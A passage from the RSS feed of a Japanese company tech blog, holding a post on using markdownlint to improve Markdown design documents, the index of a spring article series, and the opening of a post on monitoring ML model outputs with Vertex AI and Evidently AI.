      <content:encoded><![CDATA[<img src="/images/20230417b/Microsoft.VisualStudio.Services.Icons.png" alt="" width="128" height="128"><h2 id="はじめに"><a href="#はじめに" class="headerlink" title="はじめに"></a>はじめに</h2><p>フューチャー技術ブログのリレー形式の連載である、<a href="/articles/20230417a/">春の入門祭り2023</a>の1日目です。TIG真野です。</p><p>ここ数年、Markdownで設計書をチームで書き、GitHub（GitLab）上でレビューするフローを採用しています。なるべくテキストベースで設計開発フローを統一するため、私の所属するチームでは以下のようなツールを採用しています。</p><ul><li>シーケンス図、業務フロー図<ul><li>Markdown中にPlantUMLで記載</li><li>参照はGitHub上からも見れるように、<a href="https://chrome.google.com/webstore/detail/pegmatite/jegkfbnfbfnohncpcfcimepibmhlkldo">pegmatite</a> を利用</li></ul></li><li>システム構成図など画像系<ul><li>Diagrams.net（draw.io）で作成し、<code>.drawio.png</code> の拡張子でMarkdownから参照</li><li>これだけは目視で差分チェックとなる</li></ul></li><li>Web API定義<ul><li>OpenAPI SpecのYAMLファイル</li><li>参照はGitHub上からも見れるように、<a href="https://chrome.google.com/webstore/detail/swagger-viewer/nfmkaonpdmaglhjjlggfhlndofdldfag">swagger-viewer</a> を利用</li></ul></li><li>ERD<ul><li><a href="https://a5m2.mmatsubara.com/index.html">A5:SQL Mk-2</a> の <code>.a5er</code> 拡張子のファイルをコミット</li><li>ini形式のテキストファイルであるため、差分がわかりやすい</li></ul></li></ul><p>単体テストデータ管理や区分値管理など、一部Excelを利用する場面はありますが、このようなファイルを同時に複数のブランチで変更することは今の私の環境においては、あまりありません。したがって、Git上でConflictが発生するのはテキストファイルのみとなり、Conflictの解消に大きな手間はかかりません。</p><p>Markdownのフォーマッタは<a href="https://prettier.io/">Prettier</a> と、<a href="https://editorconfig.org/">EditorConfig</a>を利用し、<a href="https://textlint.github.io/">textlint</a> はリンク切れチェックのみを利用しています（他のよくあるチェック項目は、あまりにも検知件数が多かったため）。</p><p>Markdownに関しては上記のPrettier、EdictorConfig、textlintを通して最低限の品質はカバーできており、個人的には開発者体験が悪くなく気に入っています。</p><p>しかし、Markdownで設計書を充実させようとすればするほど、設計書間やメンバー間のちょっとした揺れで、本質的なレビューがしにくく感じるようになりました。そこでMarkdownのLintツールを導入するモチベーションが高まりました。typoチェックの話は別の記事でしたいので今回は割愛します。</p><h2 id="Markdown-のスタイルガイド"><a href="#Markdown-のスタイルガイド" class="headerlink" title="Markdown のスタイルガイド"></a>Markdown のスタイルガイド</h2><p>いくつか存在しますが、掲題のMarkdownlint もチェック内容のインプットにしているのが、以下のスタイルガイドです。</p><p><a href="https://cirosantilli.com/markdown-style-guide/">https://cirosantilli.com/markdown-style-guide/</a></p><p>これをきっちり読み込んで、高い意識をもって手動で守るのは大変なので、これをベースに作られたツールを利用します。</p><h2 id="MarkdownのLintツール"><a href="#MarkdownのLintツール" class="headerlink" title="MarkdownのLintツール"></a>MarkdownのLintツール</h2><p><a href="https://github.com/DavidAnson/markdownlint">DavidAnson&#x2F;markdownlint</a> が有名で、CLIツールだと<a href="https://github.com/DavidAnson/markdownlint-cli2">DavidAnson&#x2F;markdownlint-cli2</a>が今から導入する際には良さそうです。VS Code拡張にも<a href="https://marketplace.visualstudio.com/items?itemName=DavidAnson.vscode-markdownlint">markdownlint</a>という名前で存在し、リアルタイムでチェックができます。</p><p>チェック項目は <code>v0.28.1</code> で<a href="https://github.com/DavidAnson/markdownlint/blob/v0.28.1/doc/Rules.md">53のルール</a>が存在します。</p><p><a href="https://github.com/DavidAnson/markdownlint/blob/main/CHANGELOG.md">CHANGELOG</a>を見る限り、バージョンアップとともにルールが毎回追加されるという開発スタイルではなく、既存のルールのブラッシュアップが継続的に行われていました。</p><p>コマンドラインからのインストールと実行は以下です。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># インストール</span></span><br><span class="line">npm install --save-dev markdownlint-cli2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 実行</span></span><br><span class="line">markdownlint-cli2 <span class="string">&quot;**/*.md&quot;</span></span><br></pre></td></tr></table></figure><p>それなりのリポジトリであれば大量に検知されるかも知れませんが、設定ファイルを用いて重要なチェックのみに絞ると良いかと思います。また、デフォルトでは <code>.git</code> や <code>node_modules</code> もチェックするので、検査対象から外す設定も入れます。私は一通り見てみて、以下の設定にしています。</p><figure class="highlight json"><figcaption><span>.markdownlint-cli2.jsonc</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;config&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;line-length&quot;</span><span class="punctuation">:</span> <span class="keyword">false</span><span class="punctuation">,</span> <span class="comment">// MD013  行の長さ</span></span><br><span class="line">    <span class="attr">&quot;no-hard-tabs&quot;</span><span class="punctuation">:</span> <span class="keyword">false</span><span class="punctuation">,</span> <span class="comment">// MD010 Markdown中にTSVを書くとエラーになるため</span></span><br><span class="line">    <span class="attr">&quot;no-trailing-punctuation&quot;</span><span class="punctuation">:</span> <span class="keyword">false</span><span class="punctuation">,</span> <span class="comment">// MD026 ヘディングに句読点（.,;:!?）を許容したい</span></span><br><span class="line">    <span class="attr">&quot;no-inline-html&quot;</span><span class="punctuation">:</span> <span class="keyword">false</span><span class="punctuation">,</span> <span class="comment">// MD033 HTMLは許容</span></span><br><span class="line">    <span class="attr">&quot;no-bare-urls&quot;</span><span class="punctuation">:</span> <span class="keyword">false</span><span class="punctuation">,</span> <span class="comment">// MD034 URLのリンク化条件</span></span><br><span class="line">    <span class="attr">&quot;no-space-in-emphasis&quot;</span><span class="punctuation">:</span><span class="keyword">false</span><span class="punctuation">,</span> <span class="comment">// MD037  $$など数式で問題になったため外す</span></span><br><span class="line">    <span class="attr">&quot;link-fragments&quot;</span><span class="punctuation">:</span><span class="keyword">false</span> <span class="comment">// MD051 相対パス設定</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;ignores&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;.git&quot;</span><span class="punctuation">,</span> <span class="string">&quot;node_modules&quot;</span><span class="punctuation">]</span> <span class="comment">// 無視するディレクトリ</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="検知された内容"><a href="#検知された内容" class="headerlink" title="検知された内容"></a>検知された内容</h2><p>実際にとあるリポジトリで動かしてみて、200件ほど検知され全て修正してみました。観測範囲がそこだけですが、チームの癖が見えてきて面白かったです。</p><h3 id="ヘディング周り"><a href="#ヘディング周り" class="headerlink" title="ヘディング周り"></a>ヘディング周り</h3><p>MD001 というチェックは、ヘディング（見出し、ヘッダー）のレベルは 1つずつだけしか増加させてはならないというものです。</p><p> <code>###</code> → <code>#####</code> といった、おそらくフォントサイズなどの装飾を調整するため、細かくレベルを調整する人がいて、なるほどなと思いました。まずレビューでは指摘しない細かい内容なので、まさにLinter向きです。</p><figure class="highlight txt"><figcaption><span>NG.md</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">### Header 3</span><br><span class="line"></span><br><span class="line">xxx</span><br><span class="line"></span><br><span class="line">##### Header 4</span><br><span class="line"></span><br><span class="line">xxx</span><br></pre></td></tr></table></figure><p>このヘディング周りは他にもチェックが多く、例えば以下があります。トップレベルが <code>##</code> で始まるファイルはたくさんありました。</p><ul><li>MD002 最初のヘディングは <code>#</code> から始まる必要がある</li><li>MD003 ヘディングのマークアップを行頭 <code>#</code> かアンダーライン形式 <code>=====</code> のどちらかに統一する必要がある<ul><li>これに類似して、MD004 は箇条書きの <code>*</code>、<code>-</code>、<code>+</code> などが、同じレベルで異なる文字を使っている場合に検知するものです。おそらくPrettierで強制的に書き換えてくれる内容なため、今まで気にしたことが無かったので新鮮でした</li></ul></li></ul><p>地味に多かったのは、MD022 です。これはヘディングの周りに空行が必須というものです。</p><figure class="highlight text"><figcaption><span>NG.md</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 見出し1</span><br><span class="line">Some text</span><br><span class="line"></span><br><span class="line">Some more text</span><br><span class="line">## 見出し2</span><br></pre></td></tr></table></figure><figure class="highlight text"><figcaption><span>OK.md</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 見出し1</span><br><span class="line"></span><br><span class="line">Some text</span><br><span class="line"></span><br><span class="line">Some more text</span><br><span class="line"></span><br><span class="line">## 見出し 2</span><br></pre></td></tr></table></figure><p>根拠は、一部のパーサーが前後に空行が存在しないとうまく解析できないためとのこと。類似で、MD031 はコードブロックを空行で囲む必要が、MD032 はリストを空行で囲む必要があるなど、チェック数は多く感じるかも知れませんが、内容は1つ覚えれば応用が効く物が多いので、それほど難しいものではありません。</p><h3 id="ハードタブ"><a href="#ハードタブ" class="headerlink" title="ハードタブ"></a>ハードタブ</h3><p>インデントをタブ文字（\t）で揃えるファイルがありませんでしたが、ファイル中に <code>tsv</code> のコードブロックでサンプルデータを表現している設計書があり、誤検知されました。意図した動作なのかは調べていないため、回避方法があるかもしれません。</p><h3 id="リンク系"><a href="#リンク系" class="headerlink" title="リンク系"></a>リンク系</h3><p>MD011 はリンクのマークアップ誤りを検知してくれます。こんなの存在しないだろうと思っていたら、1件あります。意外と気が付かないものですね。</p><figure class="highlight md"><figcaption><span>NG.md</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Incorrect link syntax)[http://www.example.com/]</span><br></pre></td></tr></table></figure><figure class="highlight md"><figcaption><span>OK.md</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">Correct link syntax</span>](<span class="link">http://www.example.com/</span>)</span><br></pre></td></tr></table></figure><h3 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h3><p>MD034 は 生のURLを許容するかどうかです。</p><p>以下だとリンクが機能しないパーサがあるということが理由です。</p><figure class="highlight md"><figcaption><span>NG.md</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">For more information, see http://www.example.com/.</span><br></pre></td></tr></table></figure><p>回避するためには <code>&lt;&gt;</code> でURLを囲みます。</p><figure class="highlight md"><figcaption><span>OK.md</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">For more information, see <span class="language-xml">&lt;http://www.example.com/&gt;</span>.</span><br></pre></td></tr></table></figure><p>ただ、GitHub Flavored Markdownの場合は<code>&lt;&gt;</code>が無くても、リンクとして認識してくれるため、その前提の場合は除外しても良いかなと個人的には感じます。</p><h3 id="コードブロック"><a href="#コードブロック" class="headerlink" title="コードブロック"></a>コードブロック</h3><p>今回一番学びだと思ったのがこれです。</p><p>MD014 は実行するコマンドの表記に使用される行頭ドル記号をチェックします。コマンドの出力結果は記載せず、コマンドだけをドル記号付きで記載していると検知されます。</p><p>例えば、手順書において以下のように実行するシェルコマンドだけを記載することがあります。</p><figure class="highlight txt"><figcaption><span>NG.md</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ls</span><br><span class="line">$ cat foo</span><br><span class="line">$ less bar</span><br></pre></td></tr></table></figure><p>このような場合、 $ を外すべきだというチェックです。</p><figure class="highlight txt"><figcaption><span>OK.md</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br><span class="line">cat foo</span><br><span class="line">less bar</span><br></pre></td></tr></table></figure><p>根拠としては、<code>$</code> を外したほうが、コピー＆ペーストが簡単になるためということ。これはなるほどと思いました。</p><p>面白いのは、以下のようにコマンドと出力が混ざるケースは除外されるということです。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ls</span><br><span class="line">foo bar</span><br><span class="line">$ cat foo</span><br><span class="line">Hello world</span><br><span class="line">$ cat bar</span><br><span class="line">baz</span><br></pre></td></tr></table></figure><h2 id="fixコマンド"><a href="#fixコマンド" class="headerlink" title="fixコマンド"></a>fixコマンド</h2><p>さきほど200件ほど検知されたと記載しましたが、その大部分は以下のコマンドを実行すると自動で修正してくれます（対象のファイルが直接書き換えられるため、事実上フォーマッターのような動きをします）。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">markdownlint-cli2-fix <span class="string">&quot;**/*.md&quot;</span></span><br></pre></td></tr></table></figure><p>全ての検知結果を修正してくれるわけではなく<a href="https://github.com/DavidAnson/markdownlint/blob/main/doc/Rules.md">ドキュメント</a>に <code>Fixable</code> とついたもののみ修正してくれるようです。動作もコミット前後で差し込む程度であれば何ら気にならない速度ですので、開発フローに組み込んでしまえば良さそうです。</p><p>この<code>markdownlint-cli2-fix</code> は Prettierでも修正されないルールがあるため、併せて設定しておくと良さそうです。</p><h2 id="所感とまとめ"><a href="#所感とまとめ" class="headerlink" title="所感とまとめ"></a>所感とまとめ</h2><p>Markdownlintを導入してみた結果、ドキュメントの一貫性も上がり、リンク切れなど機能していない記法も検知でき品質を上げることができます。個人的には動作が高速であり、VS Codeで随時チェックもできつつ、CLIでも簡単に導入できるため、使わない手は無いなと思いました。</p><p>そして <code>fix</code> が最高すぎます。とりあえず <code>fix</code> で修正させて、GitHubなどのPull Request上のFile diffsで想定外の変換が行われていないかをチェックすれば、生産性と品質を良いバランスで実現できそうです。</p><p>次は岸下さんの<a href="/articles/20230418a/">お家で電子工作入門 ～上空のフライト情報を可視化する🛫～</a>です。</p>]]></content:encoded>
      
      
      <category domain="https://future-architect.github.io/categories/DevOps/">DevOps</category>
      
      
      <category domain="https://future-architect.github.io/tags/Linter/">Linter</category>
      
      <category domain="https://future-architect.github.io/tags/%E3%83%89%E3%82%AD%E3%83%A5%E3%83%A1%E3%83%B3%E3%83%88/">ドキュメント</category>
      
      <category domain="https://future-architect.github.io/tags/Markdown/">Markdown</category>
      
      <category domain="https://future-architect.github.io/tags/Markdownlint/">Markdownlint</category>
      
      
      <comments>https://future-architect.github.io/articles/20230417b/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>春の入門祭り</title>
      <link>https://future-architect.github.io/articles/20230417a/</link>
      <guid>https://future-architect.github.io/articles/20230417a/</guid>
      <pubDate>Sun, 16 Apr 2023 15:00:00 GMT</pubDate>
      
        
        
          
          
      <description>&lt;img src=&quot;/images/20230417a/アイキャッチ画像.jpg&quot; alt=&quot;&quot; width=&quot;1200&quot; height=&quot;800&quot; loading=&quot;lazy&quot;&gt;

&lt;p&gt;Photo taken by &lt;a</description>
          
        
      
      
      
      <content:encoded><![CDATA[<img src="/images/20230417a/アイキャッチ画像.jpg" alt="" width="1200" height="800" loading="lazy"><p>Photo taken by <a href="https://twitter.com/kaedemalu">@kaedemalu</a></p><h1 id="はじめに"><a href="#はじめに" class="headerlink" title="はじめに"></a>はじめに</h1><p>こんにちは。技術ブログ運営の藤戸四恩です。</p><p>新年度も始まり、2週間が経ち、桜が散りはじめ暖かい日々が続いておりますね。新人の方も徐々に会社に慣れてきた頃ではないかと思います。ちなみに、私はスギ花粉アレルギーを持っているのですが、落ち着いてきました。</p><p>落ち着いてきたこの時期に、2023年もフューチャーは春の入門祭りを始めます！！</p><h2 id="春の入門連載について"><a href="#春の入門連載について" class="headerlink" title="春の入門連載について"></a>春の入門連載について</h2><p>春の入門連載とは、4年連続の開催となるリレー形式で行う技術ブログの連載で、テーマは以下の3つに寄稿者を募っております。</p><ul><li>今まで触って無かった技術のやってみた記事</li><li>先輩・同期・後輩宛に、知っておいて欲しい技術沼へ落とす記事</li><li>好きな技術の布教活動をする記事</li></ul><p>今年は23名が参加します。これはフューチャーブログ史上、過去最高の人数です。</p><p>また、2022年入社が9名が参加するなど若手がたくさん参加してます。</p><p>こういった企画を通して有益な情報をカジュアルに発信する文化が、もっと広がれば良いなと願っています。</p><h2 id="投稿スケジュール・タイトル"><a href="#投稿スケジュール・タイトル" class="headerlink" title="投稿スケジュール・タイトル"></a>投稿スケジュール・タイトル</h2><p>本連載は以下のスケジュールで進めます。</p><div class="scroll"><table><thead><tr><th>日付</th><th>執筆者</th><th>タイトル</th></tr></thead><tbody><tr><td>4&#x2F;17</td><td>真野隼記</td><td><a href="/articles/20230417b/">markdownlintで設計書の品質を高める</a></td></tr><tr><td>4&#x2F;18</td><td>岸下優介</td><td><a href="/articles/20230418a/">お家で電子工作入門 ～上空のフライト情報を可視化する🛫～</a></td></tr><tr><td>4&#x2F;19</td><td>井上圭</td><td><a href="/articles/20230419a/">初めてのセキュリティ情報収集（mjckeck4)</a></td></tr><tr><td>4&#x2F;20</td><td>市川浩暉</td><td><a href="/articles/20230420a/">Cloud Data Fusionで始めるETL入門</a></td></tr><tr><td>4&#x2F;21</td><td>永井優斗</td><td><a href="/articles/20230421a/">「技術書」の読書術 読書感想文</a></td></tr><tr><td>4&#x2F;24</td><td>工藤駿泰</td><td><a href="/articles/20230424a/">初めての画像処理〜OpenCVって何ができるの？〜</a></td></tr><tr><td>4&#x2F;25</td><td>藤戸四恩</td><td><a href="/articles/20230425a/">Hack The Box Oopsie を解いてみた</a></td></tr><tr><td>4&#x2F;26</td><td>渡邉光</td><td><a href="/articles/20230426a/">Pulumiで始めるIaC入門</a></td></tr><tr><td>4&#x2F;27</td><td>小澤泰河</td><td><a href="/articles/20230427a/">CDN 入門とエッジでのアプリケーション実行</a></td></tr><tr><td>4&#x2F;28</td><td>石野可南子</td><td><a href="/articles/20230428a/">初心者による初心者のためのGit入門</a></td></tr><tr><td>5&#x2F;2</td><td>伊藤太斉</td><td><a href="/articles/20230502a/">cf-terraformingで入門するCloudflare</a></td></tr><tr><td>5&#x2F;8</td><td>齊藤英比古</td><td><a href="/articles/20230508b/">新人の時に出会いたかった本の紹介</a></td></tr><tr><td>5&#x2F;9</td><td>佐藤更星</td><td><a href="/articles/20230509a/">AWS Application Composerを使ってみた！</a></td></tr><tr><td>5&#x2F;10</td><td>高世駿</td><td><a href="/articles/20230510a/">正規表現入門</a></td></tr><tr><td>5&#x2F;12</td><td>栗栖大樹</td><td><a href="/articles/20230512a/">OS自作入門本に触れたのでOS起動までの処理概要をまとめてみた</a></td></tr><tr><td>5&#x2F;15</td><td>寒河江功悟</td><td><a href="/articles/20230515a/">Swiftの自動テスト〜導入と基本的なテスト手法〜</a></td></tr><tr><td>5&#x2F;16</td><td>斎藤賢太</td><td><a href="/articles/20230516a/">JSパッケージ管理ツールpnpmの概要と内部構造を眺める</a></td></tr><tr><td>5&#x2F;17</td><td>森直也</td><td><a href="/articles/20230517a/">WebAssemblyとEmscriptenに入門した</a></td></tr><tr><td>5&#x2F;18</td><td>佐々木駿</td><td><a href="/articles/20230518a/">ネットワーク入門としてCCNA試験を受験してみた</a></td></tr><tr><td>5&#x2F;19</td><td>小橋昌明</td><td>technology radarを見てみよう</td></tr><tr><td>5&#x2F;22</td><td>吉岡朋哉</td><td>TBD</td></tr><tr><td>5&#x2F;23</td><td>清水雄一郎</td><td>SwiftのCI</td></tr><tr><td>5&#x2F;24</td><td>棚井龍之介</td><td>TBD</td></tr><tr><td>5&#x2F;25</td><td>市川加伊斗</td><td>stanによるベイズ推定に入門して株価推移を予測してみる</td></tr></tbody></table></div><h2 id="最後に"><a href="#最後に" class="headerlink" title="最後に"></a>最後に</h2><p>寄稿者も今回が初だったり、記事の内容を初めて触る方もいるので、是非読んでいただき、シェアしていただけると嬉しいです！</p><ul><li><a href="/articles/20220418a/">2022年の連載記事</a></li><li><a href="/articles/20210414a/">2021年の連載記事</a></li><li><a href="/articles/20200529/">2020年の連載記事</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://future-architect.github.io/categories/Culture/">Culture</category>
      
      
      <category domain="https://future-architect.github.io/tags/%E5%85%A5%E9%96%80/">入門</category>
      
      <category domain="https://future-architect.github.io/tags/%E3%82%A4%E3%83%B3%E3%83%87%E3%83%83%E3%82%AF%E3%82%B9/">インデックス</category>
      
      <category domain="https://future-architect.github.io/tags/%E6%98%A5%E3%81%AE%E5%85%A5%E9%96%80%E7%A5%AD%E3%82%8A/">春の入門祭り</category>
      
      
      <comments>https://future-architect.github.io/articles/20230417a/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Vertex AI Model MonitoringとEvidently AIで運用中のモデル・データを監視する【Output Metrics編】</title>
      <link>https://future-architect.github.io/articles/20230414a/</link>
      <guid>https://future-architect.github.io/articles/20230414a/</guid>
      <pubDate>Thu, 13 Apr 2023 15:00:00 GMT</pubDate>
      
        
        
          
          
      <description>&lt;h1 id=&quot;1-はじめに&quot;&gt;&lt;a href=&quot;#1-はじめに&quot; class=&quot;headerlink&quot; title=&quot;1. はじめに&quot;&gt;&lt;/a&gt;1.</description>
          
        
      
      
      
      <content:encoded><![CDATA[<h1 id="1-はじめに"><a href="#1-はじめに" class="headerlink" title="1. はじめに"></a>1. はじめに</h1><p>こんにちは、フューチャーでアルバイトをしている板野です。</p><p>データ&#x2F;モデル監視ツールであるVertex AI Model MonitoringとEvidently AIを利用して両者を様々な観点で検証していきます。</p><p>本記事は、前回の記事：<a href="/articles/20230413a/">Vertex AI Model MonitoringとEvidently AIで運用中のモデル・データを監視する【Input Metrics編】</a>の続きです。</p><p>データ&#x2F;モデルの監視項目については主に<strong>Input Metrics</strong>と<strong>Output Metrics</strong>があることを前回の記事でお伝えし、Input Metricsの監視について検証しました。</p><p>今回は、Vertex AIとEvidently AIのそれぞれにおける<strong>Output Metrics</strong>の監視について検証します。</p><p>※データ&#x2F;モデル監視の基本については、以前に投稿された記事：<a href="/articles/20230412a/">MLシステムにおけるモデル・データの監視【概要編】</a>をご参照ください。</p><h1 id="2-Output-Metricsの監視項目"><a href="#2-Output-Metricsの監視項目" class="headerlink" title="2. Output Metricsの監視項目"></a>2. Output Metricsの監視項目</h1><p>Output Metricsを監視するには<strong>モデルからの出力</strong>が必要となります。</p><p>主に以下の項目を監視します。</p><ul><li>①モデル精度<ul><li>モデルの性能をダイレクトに把握できる指標<ul><li>回帰モデル：決定係数(R^2), 二乗平均平方根誤差(RMSE), 平均絶対誤差(MAE), 等</li><li>分類モデル：正解率(Accuracy), 適合率(Precision), ROC, AUC, 等</li></ul></li></ul></li><li>②特徴量寄与率<ul><li>各特徴量がどの程度モデルの予測結果に対してどの程度影響を与えているかを示す指標<ul><li>各説明変数-目的変数間の相関係数, Shapley値, 等</li></ul></li><li>特徴量寄与率が変化した場合、モデルの精度に影響を与えることがあるため、監視する</li><li>AIモデルの説明性が必要となるケースも多々ある<ul><li>例）なぜこの薬が処方されたか？等</li><li>「説明性の保証」のため、特徴量寄与率が変化していないか監視する</li></ul></li></ul></li><li>③予測結果の偏り<ul><li>予測結果の偏りが大きくなってしまうこと<ul><li>例）予測結果の分布が時間とともに大きく変化した等</li></ul></li></ul></li></ul><p>「モデル精度」については正解データが必要なため、ユースケースによっては指標が出るまでに遅れがあります。<br>例えば、人力で正解ラベルを付与しなければならない場合はその分待たなくてはなりません。</p><h1 id="3-前提条件"><a href="#3-前提条件" class="headerlink" title="3. 前提条件"></a>3. 前提条件</h1><p><a href="/articles/20230413a/">前回の記事</a>の<code>今回想定するユースケース</code>の部分と合わせてあるので、詳細は割愛しますが、以下の前提条件で検証を行います。</p><ul><li>天気や気温等の特徴からその日のシェアバイク利用数を予測する<strong>回帰モデル</strong>を構築している</li><li>Vertex AIのAutoML(表形式)で訓練している</li></ul><h1 id="4-Vertex-AIでOutput-Metricsを監視"><a href="#4-Vertex-AIでOutput-Metricsを監視" class="headerlink" title="4. Vertex AIでOutput Metricsを監視"></a>4. Vertex AIでOutput Metricsを監視</h1><p>Vertex AI自体にバージョンの概念はありませんが、2023&#x2F;3&#x2F;29時点の操作画面となります。</p><h2 id="4-1-監視できる項目"><a href="#4-1-監視できる項目" class="headerlink" title="4.1. 監視できる項目"></a>4.1. 監視できる項目</h2><p>Vertex AIでは、以下のような指標を監視することができます。</p><ul><li>①モデル精度<ul><li>MAE：平均絶対値誤差</li><li>MAPE：平均絶対パーセント誤差</li><li>RMSE：二乗平均平方根誤差</li><li>RMSLE：対数平均平方二乗誤差</li><li>R^2：決定係数（説明変数が目的変数をどれくらい説明できるかを示す値）</li></ul></li><li>②特徴量寄与率<ul><li>Shapleyのサンプリング近似値（<a href="https://cloud.google.com/ai-platform/prediction/docs/ai-explanations/overview?hl=ja#compare-methods">詳細</a>）</li></ul></li></ul><h2 id="4-2-監視設定と監視結果"><a href="#4-2-監視設定と監視結果" class="headerlink" title="4.2. 監視設定と監視結果"></a>4.2. 監視設定と監視結果</h2><h3 id="4-2-1-必要なもの"><a href="#4-2-1-必要なもの" class="headerlink" title="4.2.1. 必要なもの"></a>4.2.1. 必要なもの</h3><ul><li>[★1] 説明変数列（特徴量データの列）, 目的変数列（正解データの列）を含むデータ<ul><li>Google Cloud Strage上のCSVファイル or BigQuery上のデータ であること</li></ul></li></ul><h3 id="4-2-2-手順"><a href="#4-2-2-手順" class="headerlink" title="4.2.2. 手順"></a>4.2.2. 手順</h3><p>Moder Registryから作成したモデル・バージョンの詳細画面に行き、「評価を作成」をクリックします。</p><img src="/images/20230414a/2023-04-03-09-41-52.png" alt="" width="1200" height="464" loading="lazy"><p>設定項目がいくつか出てくるので、ターゲット列、ソース（[★1]）、バッチ予測の出力先を指定します。</p><p>説明可能性のオプションで、「モデル特徴量の重要度を有効にする」にチェックを入れたら「②特徴量寄与率」も監視できます。</p><p>今回は、以下の画像のように設定します。</p><img src="/images/20230414a/2023-04-03-09-53-15.png" alt="" width="764" height="1834" loading="lazy"><p>評価を開始すると、内部でバッチ予測ジョブが自動的に開始され、約20分ほどで評価が完了します。</p><p>評価や特徴量寄与率計算のための予測（推論）はここで動いています。</p><h3 id="4-2-3-監視結果"><a href="#4-2-3-監視結果" class="headerlink" title="4.2.3. 監視結果"></a>4.2.3. 監視結果</h3><p>評価の結果は以下のように見ることができます。特徴量の重要度もヒストグラムで確認することができます。</p><img src="/images/20230414a/2023-04-03-09-47-27.png" alt="" width="1200" height="730" loading="lazy"><h3 id="4-2-4-自動化とアラート"><a href="#4-2-4-自動化とアラート" class="headerlink" title="4.2.4. 自動化とアラート"></a>4.2.4. 自動化とアラート</h3><p>今回の記事には含まれていませんが、以上の手順を自動化する場合、<a href="https://cloud.google.com/vertex-ai/docs/tabular-data/forecasting/evaluate-model?hl=ja#api">Vertex AI API</a>を利用して自動で定期実行することができると考えられます。</p><p>Vertex AI自体に、評価結果が悪くなった際のアラート発生機能はありませんが、REST APIの結果を受け取り、前回の評価結果と比較するシステムを構築すればアラートを発生させることも可能と考えられます。</p><h2 id="4-3-コスト"><a href="#4-3-コスト" class="headerlink" title="4.3. コスト"></a>4.3. コスト</h2><ul><li>実装コスト<ul><li>評価を行うこと自体はVertex AIのコンソール画面から設定できるのでほぼ実装コストは掛かりません</li><li>自動化する場合は、Vertex AI APIを使って処理を実装する必要があります</li></ul></li><li>金銭的コスト<ul><li>評価ジョブ自体にどのくらいのノード時間を費やしているか不明ですが、少なくとも評価ジョブに含まれるバッチ予測ジョブには<a href="https://cloud.google.com/vertex-ai/pricing?hl=ja#prediction-prices">こちら</a>に示されている費用が掛かると考えられます</li><li>Vertex AI APIを動かすサーバ・関数等のコストが掛かります</li></ul></li></ul><h1 id="5-Evidently-AIでOutput-Metricsを監視"><a href="#5-Evidently-AIでOutput-Metricsを監視" class="headerlink" title="5. Evidently AIでOutput Metricsを監視"></a>5. Evidently AIでOutput Metricsを監視</h1><p>Evidently AIのバージョンは<code>0.2.6</code>を使用しています。</p><h2 id="5-1-監視できる項目"><a href="#5-1-監視できる項目" class="headerlink" title="5.1. 監視できる項目"></a>5.1. 監視できる項目</h2><p>Evidently AIでは、以下のような指標を監視することができます。</p><ul><li>①モデル精度<ul><li>ME：平均誤差</li><li>MAE：平均絶対値誤差</li><li>MAPE：平均絶対パーセント誤差</li></ul></li><li>②特徴量寄与率<ul><li>各説明変数-目的変数間の相関係数</li></ul></li><li>③予測結果の偏り<ul><li>過去の予測結果と現在の予測結果の分布の違い</li></ul></li></ul><p>また、Evidently AIでは視覚的にモデルの精度変化を把握できるようなグラフも出力することができます。</p><h2 id="5-2-監視設定と監視結果"><a href="#5-2-監視設定と監視結果" class="headerlink" title="5.2. 監視設定と監視結果"></a>5.2. 監視設定と監視結果</h2><h3 id="5-2-1-必要なもの"><a href="#5-2-1-必要なもの" class="headerlink" title="5.2.1 必要なもの"></a>5.2.1 必要なもの</h3><ul><li>[★2] 